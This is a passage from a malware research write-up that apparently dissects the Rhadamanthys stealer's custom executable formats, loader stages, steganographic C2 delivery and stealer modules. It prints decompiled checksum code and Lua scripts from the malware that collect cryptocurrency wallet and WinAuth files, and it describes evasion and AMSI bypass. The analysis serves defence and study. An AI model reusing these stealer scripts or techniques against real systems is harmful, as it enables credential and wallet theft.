<p>But there are other, more meaningful changes further on. First of all, a new obfuscation is applied. The names of the DLLs are no longer in plaintext but processed by a simple algorithm. The key is customizable and stored in the header. The decoding function is called by a wrapper function of&nbsp;<code>LoadLibaryA</code>, so the deobfuscation takes place just before the needed DLL is about to be loaded:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId144.png" alt="Figure 29: A wrapper function called during the loading of the
module’s imports"/><figcaption class="wp-element-caption">Figure 29: A wrapper function called during the loading of the module’s imports</figcaption></figure>



<p>The decoding of the name is done by a custom, XOR-based algorithm:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId147.png" alt="Figure 30: A function decoding DLL names"/><figcaption class="wp-element-caption">Figure 30: A function decoding DLL names</figcaption></figure></div>


<p>The imported functions are still loaded by their checksums (just like in the RS format), but the checksum algorithm has changed. This is the implementation from the RS module:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">namespace rs_exe {
    DWORD calc_checksum(BYTE* a1)
    {
        BYTE* ptr; 
        unsigned int result;
        char i;
        int v4;
        int v5;

        ptr = a1;
        result = 0;
        for (i = *a1; i; ++ptr)
        {
            v4 = (result >> 13) | (result &lt;&lt; 19);
            v5 = i;
            i = ptr[1];
            result = v4 + v5;
        }
        return result;
    }
};</pre>



<p>In the XS format, it was replaced with a different one:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">namespace xs_exe {
int calc_checksum(BYTE* name_ptr, int imp_key)
    {
        while (*name_ptr)
        {
            int val = (unsigned __int8)*name_ptr++ ^ (16777619 * imp_key);
            imp_key = val;
        }
        return imp_key;
    }
};</pre>



<p>The new algorithm was also enhanced by the introduction of an additional key that can be supplied by the caller.</p>



<p>Once again, the checksums are stored in places of the&nbsp;<a href="https://0xrick.github.io/win-internals/pe6/">thunks</a>, but their position got slightly modified. In the&nbsp;<code>RS</code>&nbsp;format, the checksums were stored at&nbsp;<code>PIMAGE_IMPORT_BY_NAME</code>. Now they are stored at&nbsp;<code>PIMAGE_IMPORT_BY_NAME</code>&nbsp;→&nbsp;<code>Name</code>, so it is shifted by one&nbsp;<code>WORD</code>.</p>



<p>As for the key, it uses&nbsp;<code>imp_key</code>&nbsp;stored in the XS header, and it is the same as for decoding the DLL names. As the DLL name is now obfuscated, another field was added to store its original length. The author also decided to obfuscate this value with the help of another simple algorithm.</p>



<p>The full imports loading function of the XS format looks like this:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId151.png" alt="Figure 31: Imports loading of the XS module."/><figcaption class="wp-element-caption">Figure 31: Imports loading of the XS module.</figcaption></figure></div>


<p>The other change introduced in the new format is a custom relocations table. In the previous format, as well as in the formats used by the Hidden Bee, relocations were the only component identical to the one used by the PE. This time, the author decided to change it and created his own modified way of relocating the module.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId154.png" alt="Figure 32: The function applying relocations for the XS module"/><figcaption class="wp-element-caption">Figure 32: The function applying relocations for the XS module</figcaption></figure></div>


<p>The stored relocations table looks very different than the one used by PE. Reconstruction of the structures used:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct xs_relocs_block
{
        DWORD page_rva;
        DWORD entries_count;
};

struct xs_relocs // the main structure, pointed by the data directory RVA
{
        DWORD count;
        xs_relocs_block blocks[1];
};

// after the list of reloc blocks, there are entries in the following format:
struct xs_reloc_entry {
        BYTE field1_hi;
        BYTE mid;
        BYTE field2_low;
};</pre>



<p>Offsets of the fields to be relocated are stored in pairs and compressed into 3 bytes.</p>



<p>First offset from the pair:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="558" height="298" src="https://research.checkpoint.com/wp-content/uploads/2023/08/triplet1.png" alt="" class="wp-image-28665" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/triplet1.png 558w, https://research.checkpoint.com/wp-content/uploads/2023/08/triplet1-300x160.png 300w" sizes="(max-width: 558px) 100vw, 558px" /><figcaption class="wp-element-caption">Figure 33: Relocation offsets are stored in pairs within 3 bytes. The first pair consists of the first byte and the last nibble of the second byte.</figcaption></figure></div>


<p>Second offset from the pair:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="556" height="294" src="https://research.checkpoint.com/wp-content/uploads/2023/08/triplet2.png" alt="" class="wp-image-28666" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/triplet2.png 556w, https://research.checkpoint.com/wp-content/uploads/2023/08/triplet2-300x159.png 300w" sizes="(max-width: 556px) 100vw, 556px" /><figcaption class="wp-element-caption">Figure 34: Relocation offsets are stored in pairs within 3 bytes. The second pair consists of the first nibble of the second byte and the third byte.</figcaption></figure></div>


<p>The RVA of the field to be relocated is calculated by&nbsp;<code>page_rva + offset</code>. There is no default base, so the new module base is simply added to the field content.</p>



<p>The complete converter of the XS format is available here:</p>



<ul class="wp-block-list">
<li><a href="https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/xs_exe.cpp">https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/xs_exe.cpp</a></li>
</ul>



<h3 class="wp-block-heading" id="the-xs-format-variant-2">The XS format: Variant 2</h3>



<p>When we reach the Stage 3 of the malware and follow the unpacked components that are downloaded from the C2, we once again see the familiar XS header revealed in memory:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId165.png" alt="Figure 35: The next stage module unpacked from the package downloaded
from the C2"/><figcaption class="wp-element-caption">Figure 35: The next stage module unpacked from the package downloaded from the C2</figcaption></figure>



<p>Although at first glance, we may think that we are dealing with an identical format, when we take a closer look, we find that the previous converter no longer works. The format has undergone subtle yet significant modifications. The first thing that we may notice is that information of whether the module is 32-bit or 64-bit is no longer stored in the header. The first field after the XS magic now stores the number of sections. There are also other fields that have been swapped or removed compared to the first XS variant. The reconstruction of the header:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct xs_section
{
  _DWORD rva;
  _DWORD raw;
  _DWORD size;
  _DWORD flags; //a section can be skipped if the flag is not set
};

struct xs2_data_dir
{
  _DWORD rva;
  _DWORD size;
};

struct xs2_format
{
  _WORD magic;
  _WORD sections_count;
  _WORD header_size;
  _WORD imp_key;
  _DWORD module_size;
  _DWORD entry_point;
  _DWORD entry_point_alt;
  xs2_data_dir imports;
  xs2_data_dir exceptions;
  xs2_data_dir relocs;
  xs_section sections[SECTIONS_COUNT];
};

struct xs2_import
{
  _DWORD dll_name_rva;
  _DWORD first_thunk;
  _DWORD original_first_thunk;
  _BYTE obf_dll_len[2];
};</pre>



<p>The Data Directory fields were swapped. In addition, in the import record, the obfuscated length of the DLL name is now stored as 2 bytes instead of 4 bytes. Some other fields of the XS main header also have been relocated or removed.</p>



<p>Another detail that has changed is the way sections are mapped from the raw format to virtual. Now, some of the sections can be excluded from loading based on the flag in the section’s header.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="837" height="573" src="https://research.checkpoint.com/wp-content/uploads/2023/08/mapping_xs2.png" alt="" class="wp-image-28668" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/mapping_xs2.png 837w, https://research.checkpoint.com/wp-content/uploads/2023/08/mapping_xs2-300x205.png 300w, https://research.checkpoint.com/wp-content/uploads/2023/08/mapping_xs2-768x526.png 768w" sizes="(max-width: 837px) 100vw, 837px" /><figcaption class="wp-element-caption">Figure 36: The intermediary shellcode (<a href="https://www.virustotal.com/gui/file/9bd76b70333c0b709020ae71bfbea6ec68a4a7b1789610ab767943d666531e60/detection">de838d7fc201b6a995c30b717172b470</a>) mapping sections of an XS2 module</figcaption></figure></div>


<p>This is the trick that the author uses in order to disrupt the dumping of the module from memory. The vital sections are separated by inaccessible regions that make reading the continuous memory area difficult.</p>



<p>Aside from these few changes, both XS variants are still very similar. They contain the same import resolution, as well as the same way of applying relocations.</p>



<h2 class="wp-block-heading" id="similarities-across-the-formats">Similarities across the formats</h2>



<p>In addition to some fields being swapped or others removed, we can see a large overlap of the discussed formats that doesn’t just stem from their common predecessor, PE.</p>



<p>As we can see, the initial part of the header is consistent between Hidden Bee’s NS and Rhadamanthys’ RS and HS formats:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">    typedef struct {
        WORD magic;
        WORD machine_id;
        WORD sections_count;
        WORD hdr_size;
        DWORD entry_point;
        DWORD module_size;
//...
}</pre>



<p>Next, a minimized version of the Data Directory is used. It contains only a few records &#8211; usually Imports and Relocations (but it may also contain an Exception Table).</p>



<p>After the Data Directory, the list of sections follows, which was further minimized by removing the Characteristics field.</p>



<p>One of the improvements that was introduced in the RS format is the obfuscation of the import names. The original strings are now replaced by checksums, stored in the place of&nbsp;<code>PIMAGE_IMPORT_BY_NAME</code>.</p>



<p>The new XS format is clearly the next stage of evolution. The function names are also loaded by checksums but with an additional obfuscation that necessitates using the customizable key stored in the header. In addition, the library names are now stored in obfuscated form.</p>



<p>Overall, it is visible that the custom executable formats are subject to continuous evolution. The newly introduced changes are meant to obfuscate it further and increasingly diverge from the original PE format.</p>



<figure class="wp-block-table"><table><thead><tr><th>Format</th><th>Customized PE header</th><th>Customized imports loading</th><th>Customized relocations</th><th>Customized exception handling</th></tr></thead><tbody><tr><td>NS</td><td>✓</td><td>partial</td><td>x</td><td>✓</td></tr><tr><td>RS</td><td>✓</td><td>✓</td><td>x</td><td>✓</td></tr><tr><td>HS</td><td>✓</td><td>partial</td><td>x</td><td>✓</td></tr><tr><td>XS</td><td>✓</td><td>✓</td><td>✓</td><td>✓</td></tr></tbody></table></figure>



<p>The HS format of Rhadamanthys is the closest to the NS format from Hidden Bee. Below, we can see a comparison of the headers:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId174.png" alt="Figure 37: Highlighted differences between the reconstructed header
of the NS format (Hidden Bee) and the HS format (Rhadamanthys)"/><figcaption class="wp-element-caption">Figure 37: Highlighted differences between the reconstructed header of the NS format (Hidden Bee) and the HS format (Rhadamanthys)</figcaption></figure>



<h2 class="wp-block-heading" id="the-benefits-of-understanding-custom-formats">The benefits of understanding custom formats</h2>



<p>The main benefit of understanding the custom formats is that it enables us to reconstruct them as PE files. This makes them easier to analyze, as they can be parsed by standard analysis tools.</p>



<p>In this section, we review the converted results (PEs) that we obtained and provide an overview of their functionality. We also highlight how the equivalent components have changed across the different versions.</p>



<p>Let’s start by comparing the converted Stage 2 modules of the RS and XS1 formats.</p>



<h3 class="wp-block-heading" id="the-2nd-stage-loader-rs-converted">The 2nd stage loader: RS converted</h3>



<p>After the loading of this module is completed, the execution is redirected to the main function.</p>



<p>As mentioned earlier (Figure 15), the module depends on data that is passed from Stage 1, namely the compressed package with other components and the encrypted configuration, which is protected by the RC4 algorithm.</p>



<p>The RC4-encrypted block is decrypted at the beginning of the function using the hardcoded key.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId178.png" alt="Figure 38: The main function of the RS module. The decrypted
configuration is passed to the next function."/><figcaption class="wp-element-caption">Figure 38: The main function of the RS module. The decrypted configuration is passed to the next function.</figcaption></figure>



<p>If the decryption of the configuration is successful, the output block should start with the magic&nbsp;<code>!RHY</code>. After the verification, the sample makes sure that there isn’t another instance running by trying to lock the mutex. After both checks are passed, the config and the compressed package are passed to the next function, where the main functionality of the modules is deployed.</p>



<p>As it turns out, the current module incorporates multiple different features, such as:</p>



<ul class="wp-block-list">
<li>Evasion</li>



<li>Loading of the further components from the supplied package</li>



<li>Connecting to the C2 and downloading the next stage</li>
</ul>



<p>The URL used to contact the C2 is obtained from the config. It is used to fetch Stage 3, which will be loaded either into the current process (if run on a 32-bit environment) or into another 64-bit process.</p>



<p>First, the deobfuscated URL is stored in another structure that is passed to a function responsible for the HTTP connection:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId181.png" alt="Figure 39: Setting up the structures used by the C2
communication."/><figcaption class="wp-element-caption">Figure 39: Setting up the structures used by the C2 communication.</figcaption></figure>



<p>Before the connection is attempted, the malware calls a variety of different environment checks in order to evade sandboxes and other supervised environments.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId184.png" alt="Figure 40: The function deploying evasion checks before the
connection to the C2 is attempted."/><figcaption class="wp-element-caption">Figure 40: The function deploying evasion checks before the connection to the C2 is attempted.</figcaption></figure>



<p>Which evasion checks are going to be enabled depends on the flags that were passed from the configuration block (the&nbsp;<code>!RHY</code>&nbsp;format).</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId187.png" alt="Figure 41: The deployed environment checks depend on the flags set in
the configuration."/><figcaption class="wp-element-caption">Figure 41: The deployed environment checks depend on the flags set in the configuration.</figcaption></figure>



<p>The code performing the checks is mostly copied from an open-source utility,&nbsp;<a href="https://github.com/LordNoteworthy/al-khaser">Al-Khaser</a>.</p>



<p>The connection with the C2 is established only if the checks pass.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId191.png" alt="Figure 42: Inside the function setting up the callbacks executed
during the HTTP/S connection."/><figcaption class="wp-element-caption">Figure 42: Inside the function setting up the callbacks executed during the HTTP/S connection.</figcaption></figure>



<p>The function denoted as&nbsp;<code>parse_response</code>&nbsp;is responsible for decoding the next stage that was downloaded from the C2 and hidden in a media file (JPG). In the current case, the expected output is a package in a custom&nbsp;<code>!Rex</code>&nbsp;format, which is a virtual filesystem that contains additional components. If the payload is fetched, decoded, and passes validation, the malware loads the retrieved components. The way in which it proceeds depends if the main malware executable (that is 32-bit) is running on a 64-bit or a 32-bit system.</p>



<p>On a 32-bit system, the next stage is loaded directly into the current process. By following the related part of the code, we can conclude that the next stage component is expected to be a shellcode. First, a small data structure is prepared and filled by all the elements that the shellcode needs to run: a small custom IAT containing the necessary functions, as well as data, such as the RC4 key.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId194.png" alt="Figure 43: Preparing the data for the shellcode and deploying it."/><figcaption class="wp-element-caption">Figure 43: Preparing the data for the shellcode and deploying it.</figcaption></figure></div>


<p>If the malware is executed in a 64-bit environment, it will first redeploy itself in a 64-bit mode. To do so, it needs additional components fetched from the compressed block.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="757" height="815" src="https://research.checkpoint.com/wp-content/uploads/2023/08/next_parts.png" alt="" class="wp-image-28669" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/next_parts.png 757w, https://research.checkpoint.com/wp-content/uploads/2023/08/next_parts-279x300.png 279w" sizes="(max-width: 757px) 100vw, 757px" /><figcaption class="wp-element-caption">Figure 44: Execution path for the 64-bit environment: creating named mapping to share information between the processes unpacking a DLL to be deployed.</figcaption></figure></div>


<p>We can also see that the malware creates a named mapped section that will be used for sharing data between the components. The name of the section is first randomly generated. Then, together with some other data, it is filled into the next shellcode (<code>prepare.bin</code>) fetched from the initial package. This model of using named mapped sections to share data between different components was also used extensively by Hidden Bee.</p>



<p>Looking at the above code, we can see that the compressed data block is first uncompressed. At this point, the components are still loaded from the first package passed from the Stage 1 binary (rather than from the downloaded one). Elements stored inside the package are fetched by their names. Two elements are referenced:&nbsp;<code>prepare.bin</code>&nbsp;and&nbsp;<code>dfdll.dll</code>.</p>



<p>This DLL is further dropped into the&nbsp;<code>%APPDATA%</code>&nbsp;directory, disguised as a DLL related to NSIS installers.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="656" height="601" src="https://research.checkpoint.com/wp-content/uploads/2023/08/drop_path.png" alt="" class="wp-image-28670" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/drop_path.png 656w, https://research.checkpoint.com/wp-content/uploads/2023/08/drop_path-300x275.png 300w" sizes="(max-width: 656px) 100vw, 656px" /><figcaption class="wp-element-caption">Figure 45: Fragment of the code responsible for unpacking the DLL and preparing the arguments that are passed to the deployed export function</figcaption></figure></div>


<p>Overall, the main purpose of this stage is to download and deploy the final malicious components, which are shipped in a custom package.</p>



<h3 class="wp-block-heading" id="the-2nd-stage-loader-xs1-converted">The 2nd stage loader: XS1 converted</h3>



<p>Let’s have a look at the next version of the analogous loader, this time converted from the XS binary.</p>



<p>Just like in the case of the RS format, the start function of the XS module completes self-loading and then proceeds to the main function.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId204.png" alt="Figure 46: The function at the Entry Point of the XS module"/><figcaption class="wp-element-caption">Figure 46: The function at the Entry Point of the XS module</figcaption></figure></div>


<p>Inside the&nbsp;<code>main_func</code>, the passed configuration gets decrypted and verified.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId207.png" alt="Figure 47: The main function of the XS module: After config decoding
and verification, the execution proceeds to load the next modules."/><figcaption class="wp-element-caption">Figure 47: The main function of the XS module: After config decoding and verification, the execution proceeds to load the next modules.</figcaption></figure>



<p>The way in which the config is deobfuscated slightly changed compared to the RS module. Now the data is passed as Base64 encoded with a custom charset (<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz*$</code>). After being decoded, it is RC4 decrypted (with the same key as used by the previous version). Then, another layer of deobfuscation follows: the result is processed with an XOR-based algorithm. While the deobfuscation process is more complicated, the result has an analogous format to what we observed in the RS versions. Example:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId210.png" alt="Figure 48: The decrypted configuration (from the XS format)."/><figcaption class="wp-element-caption">Figure 48: The decrypted configuration (from the XS format).</figcaption></figure></div>


<p>If the config was successfully decrypted, the malware proceeds with its initialization. First, it verifies if it was already run by checking the value&nbsp;<code>sn</code>&nbsp;under its installation key, impersonating&nbsp;<a href="https://www.solvusoft.com/en/file-extensions/software/sibcode/">SibCode</a>: HKEY_CURRENT_USER:&nbsp;<code>Software\SibCode</code>. The stored value should contain the timestamp of the malware’s last run. If the last run time was too recent (below the threshold), the malware won’t proceed.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId214.png" alt="Figure 49: The function checking the values saved in the
registry."/><figcaption class="wp-element-caption">Figure 49: The function checking the values saved in the registry.</figcaption></figure>



<p>It further checks if the instance is already running by verifying the mutex (generated in a format&nbsp;<code>MSCTF.Asm.{%08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}</code>&nbsp;just as in the previous version of the loader.).</p>



<p>Depending on the Windows version, it may try to rerun itself with elevated privileges, using runas.</p>



<p>Otherwise, it proceeds to the next function, denoted as&nbsp;<code>decrypt_and_load_modules</code>. This function is mainly used for loading and deploying other components from the package that was passed from the previous layer. The snippet is given below. Note that in this case as well, the author added additional obfuscation: a padding of random bytes that is filled before the actual module start.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId217.png" alt="Figure 50: Fragment of the code responsible for fetching and loading
additional custom module (”unhook.bin”)."/><figcaption class="wp-element-caption">Figure 50: Fragment of the code responsible for fetching and loading additional custom module (”unhook.bin”).</figcaption></figure>



<p>Compared to Stage 2 in the earlier analyzed version, the biggest change is the increased modularity: now the main module of the stage is just a loader, and each part of the functionality is separated into a distinct unit. Initially, most of the above functionalities were combined in a single Stage 2 component. This shift towards modularity is a gradual one across consecutive versions.</p>



<p>An overview of the modules is given below.</p>



<figure class="wp-block-table"><table><thead><tr><th>Name</th><th>Format</th><th>Description</th></tr></thead><tbody><tr><td>prepare.bin</td><td>shellcode</td><td>The initial stub injected into a process, responsible for loading into it further components</td></tr><tr><td>proto.bin</td><td>shellcode</td><td>&#8211;</td></tr><tr><td>netclient.bin</td><td>XS</td><td>Responsible for the connection with the C2 and downloading of further modules</td></tr><tr><td>phexec.bin</td><td>XS</td><td>Prepares stubs with extracted syscalls, maps prepare.bin into a 64-bit process</td></tr><tr><td>unhook.bin</td><td>XS</td><td>Checks DLLs against hooks</td></tr><tr><td>heur.bin</td><td>XS</td><td>&#8211;</td></tr><tr><td>ua.txt</td><td>plaintext</td><td>A list of user-agents (a random user-agent from the list will be selected and used for the internet connection)</td></tr><tr><td>dt.bin</td><td>XS</td><td>Evasion checks</td></tr><tr><td>commit.bin</td><td>XS</td><td>&#8211;</td></tr></tbody></table></figure>



<p>It is clear that the author is progressing toward increased customization. Even the list of User Agents is now configurable and stored in a separate file (<code>ua.txt</code>). It is decoded from the package and then passed to the further module,&nbsp;<code>netclient.bin</code>, which establishes the connection to the C2. There are also more options to deliver the final stage. In the previous version, it was shipped as a JPG, and now it can also be delivered as a WAV.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId220.png" alt="Figure 51: Parsing the downloaded content. Depending on the retrieved
content, a JPG or WAV parsing function is selected."/><figcaption class="wp-element-caption">Figure 51: Parsing the downloaded content. Depending on the retrieved content, a JPG or WAV parsing function is selected.</figcaption></figure>



<p>The functions responsible for decoding both forms of the payloads are analogous.</p>



<p>The fragment of JPG decoding &#8211; after the payload decryption, the SHA1 hash stored in the header is compared with the hash that is calculated from the content:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId223.png" alt="Figure 52: Decoding the package from the JPG file"/><figcaption class="wp-element-caption">Figure 52: Decoding the package from the JPG file</figcaption></figure></div>


<p>The fragment of WAV decoding &#8211; note that for verification, a different hash is used: SHA256 instead of SHA1:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="599" height="320" src="https://research.checkpoint.com/wp-content/uploads/2023/09/decode_wav.png" alt="" class="wp-image-28705" srcset="https://research.checkpoint.com/wp-content/uploads/2023/09/decode_wav.png 599w, https://research.checkpoint.com/wp-content/uploads/2023/09/decode_wav-300x160.png 300w" sizes="(max-width: 599px) 100vw, 599px" /><figcaption class="wp-element-caption">Figure 53: Decoding the package from the WAV file</figcaption></figure></div>


<p>After decoding the downloaded file, we obtain another package containing further modules.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId229.png" alt="Figure 54: The package decoded from the WAV is revealed in memory.
Hash verification passed."/><figcaption class="wp-element-caption">Figure 54: The package decoded from the WAV is revealed in memory. Hash verification passed.</figcaption></figure>



<p>An analogous way of delivering further components was used by Hidden Bee (details described in the Malwarebytes article: [<a href="https://www.malwarebytes.com/blog/news/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack">9</a>]).</p>



<p>The media files are used to store the payload, hidden in a steganographic way, and additionally encrypted. Part of the payload is encoded within the media file itself, and the remaining part &#8211; appended at the end.</p>



<h3 class="wp-block-heading" id="the-stealer-component-hsxs2-format">The stealer component (HS/XS2 format)</h3>



<p>The main component of the malware is downloaded from the C2 and revealed as the third stage. Depending on the version, it was observed in HS or XS2 custom formats. The component is responsible for the core operations of the malware, related to stealing information. During its execution, it further loads additional modules from the same package, some of which are executables in the same custom format.</p>



<p>Let’s have a quick look at selected features, mainly focusing on the HS variant.</p>



<p>The building blocks of the module’s start function are similar to the cases described earlier: finishing the module’s loading process and then passing the execution to the main function. However, we can see some new functions were added at this initial stage. For example, there is a function installing a patch responsible for AMSI bypass. This bypass is needed due to the fact that the current module is going to load .NET modules and deploy malicious PowerShell scripts.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId235.png" alt="Figure 55: Start function of the main stealer component (HS
variant)"/><figcaption class="wp-element-caption">Figure 55: Start function of the main stealer component (HS variant)</figcaption></figure>



<p>The main function of the module contains different execution paths, which are selected depending on the command ID that was passed as one of the arguments. That means the layer above decides which actions are deployed. Many of the commands are responsible for loading/unloading certain modules and injection into other processes. Other commands are involved in the immediate deployment of malicious capabilities.</p>



<p>Most of the additional modules are fetched by hardcoded paths that we can find in the binary. Example:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">/bin/runtime.exe
/extension/%08x.lua
/bin/i386/stub.dll
/bin/KeePassHax.dll
/bin/i386/stubmod.bin
/bin/i386/coredll.bin
/bin/i386/stubexec.bin
/bin/amd64/preload.bin
/bin/amd64/coredll.bin
/bin/amd64/stub.dll</pre>



<p>The path format is analogous to what we observed in Hidden Bee. We provide additional explanations in a later chapter.</p>



<p>Just like Hidden Bee, Rhadamanthys can run LUA scripts. In the older version of the module (HS variant), the scripts were referenced by paths with the&nbsp;<code>.lua</code>&nbsp;extension:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId238.png" alt="Figure 56: Fragment of the function fetching LUA extensions from the
package (HS variant)."/><figcaption class="wp-element-caption">Figure 56: Fragment of the function fetching LUA extensions from the package (HS variant).</figcaption></figure>



<p>In the latest (XS) version, the extension has been replaced with a custom one,&nbsp;<code>.xs</code>:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId241.png" alt="Figure 57: Fragment of the function fetching LUA extensions from the
package (XS variant)."/><figcaption class="wp-element-caption">Figure 57: Fragment of the function fetching LUA extensions from the package (XS variant).</figcaption></figure>



<p>However, looking inside the unpacked content, we can see that the scripts didn’t change that much and are still written in LUA.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId244.png" alt="Figure 58: The LUA script revealed in memory"/><figcaption class="wp-element-caption">Figure 58: The LUA script revealed in memory</figcaption></figure></div>


<p>The malware supports up to 100 scripts, but only 60 were used in the analyzed cases. The scripts implement a variety of targeted stealers.</p>



<p>For example, some of them are used for stealing specific cryptocurrency wallets:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">local file_count = 0
if not framework.flag_exist("W") then
    return
end
local filenames = {
    framework.parse_path([[%AppData%\DashCore\wallets\wallet.dat]]),
    framework.parse_path([[%LOCALAppData%\DashCore\wallets\wallet.dat]])
}
for _, filename in ipairs(filenames) do
    if filename ~= nil and framework.file_exist(filename) then
        if file_count > 0 then
            break
        end
        framework.add_file("DashCore/wallet.dat", filename)
        file_count = file_count + 1
    end
end
if file_count > 0 then
    framework.set_commit("!CP:DashCore")
end</pre>



<p>Or account profiles:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">local files = {}
local file_count = 0
if not framework.flag_exist("2") then
    return
end
local filename = framework.parse_path([[%AppData%\WinAuth\winauth.xml]])
if path ~= nil and framework.path_exist(path) then
    framework.add_file("winauth.xml", filename)
    framework.set_commit("$[2]WinAuth")
end</pre>



<p>The set of additional modules contain also some .NET executables (written in .NET 4.6.1). For example, the module named&nbsp;<code>runtime.exe</code>&nbsp;that is responsible for running supplied Powershell scripts:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId247.png" alt="Figure 59: The .NET module: runtime.exe (decompiled using dnSpy)"/><figcaption class="wp-element-caption">Figure 59: The .NET module: runtime.exe (decompiled using dnSpy)</figcaption></figure></div>


<p>The&nbsp;<code>KeePassHax.dll</code>&nbsp;is another .NET executable, responsible for dumping KeePass credentials and sending them to the C2. Fragment of the code:</p>



